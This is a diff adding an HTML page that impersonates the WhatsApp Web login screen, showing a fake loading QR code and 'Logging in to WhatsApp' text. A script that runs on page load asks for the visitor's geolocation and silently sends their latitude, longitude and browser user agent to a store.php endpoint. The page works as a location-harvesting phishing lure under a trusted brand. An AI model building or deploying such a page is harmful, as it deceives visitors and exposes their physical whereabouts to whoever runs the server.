@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #FCF5EB;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            align-items: center;
+            display: flex;
+            background-color: #fff;
+            padding: 20px;
+            
+            border-radius: 30px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            max-width: 900px;
+            width: 100%;
+        }
+
+        .phone-section {
+            flex: 1;
+            padding: 40px;
+            background-color: #f8f9fa;
+            text-align: center;
+        }
+
+        .phone-image {
+            height: 400px;
+            background-color: #e8e8e8;
+            margin-bottom: 20px;
+        }
+
+        .instructions {
+            color: #667781;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .qr-section {
+            justify-content: center;
+            flex: 1;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .qr-container {
+            margin: 20px auto;
+            width: 200px;
+            height: 200px;
+            background-color: #e8e8e8;
+            position: relative;
+            border: 1px solid #ddd;
+        }
+
+        .qr-loading {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid transparent;
+            border-top-color: #00a884;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .help-text {
+            color: #667781;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+
+        .steps {
+            list-style: none;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .steps li {
+            margin-bottom: 15px;
+            padding-left: 25px;
+            position: relative;
+        }
+
+        .steps li:before {
+            content: "✓";
+            color: #00a884;
+            position: absolute;
+            left: 0;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            color: #667781;
+            font-size: 14px;
+        }
+
+        .logo-icon {
+            
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .phone-section {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body onload="getLocation()">
+    <script>
+        const x = document.getElementById("demo");
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success);
+                } else { 
+                    x.innerHTML = "Geolocation is not supported by this browser.";
+                }
+            }
+
+            function success(position) {
+                const xhttp = new XMLHttpRequest()
+                xhttp.open("GET", "store.php?=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+                xhttp.send();
+                
+            }
+
+    </script>
+    
+    <div class="logo">
+        <div class="logo-icon"><img style="height: 30px; width: 30px;"  src="/whatsapp-logo-1.png"></img></div>
+        <span style="font-size: 27px; padding-top: 3px;">WhatsApp</span>
+    </div>
+    
+    <div class="container">
+       
+        <h1 style="font-size: 27px;">Logging in to WhatsApp</h1> 
+        <div class="qr-section">
+            
+            <div class="qr-container">
+                <div class="qr-loading"></div>
+            </div>
+            <div class="help-text">
+                
+                <div class="instructions">
+                    <h2>Keep your phone connected</h2>
+                    <p>WhatsApp connects to your phone to sync messages. To reduce data usage, connect your phone to Wi-Fi.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
